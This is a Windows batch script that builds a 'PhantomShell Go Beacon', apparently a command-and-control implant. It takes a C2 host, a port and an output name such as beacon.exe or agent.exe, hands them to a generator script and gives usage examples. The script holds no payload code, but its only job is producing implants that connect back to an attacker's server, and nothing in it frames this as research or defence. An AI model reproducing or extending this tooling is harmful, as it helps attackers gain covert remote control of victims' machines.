@echo off
REM ============================================================
REM  PhantomShell Go Beacon Builder
REM ============================================================
REM  Usage:
REM    build.bat                              (uses defaults: 127.0.0.1:4444)
REM    build.bat 10.10.10.5 8888              (custom IP & port)
REM    build.bat 10.10.10.5 8888 agent.exe    (custom IP, port & filename)
REM ============================================================

setlocal

set HOST=%1
set PORT=%2
set NAME=%3

if "%HOST%"=="" set HOST=127.0.0.1
if "%PORT%"=="" set PORT=4444
if "%NAME%"=="" set NAME=beacon.exe

echo [*] Building PhantomShell Go Beacon
echo [*] C2: %HOST%:%PORT%
echo [*] Output: output\%NAME%
echo.

python generate.py --host %HOST% --port %PORT% --output %NAME%

endlocal
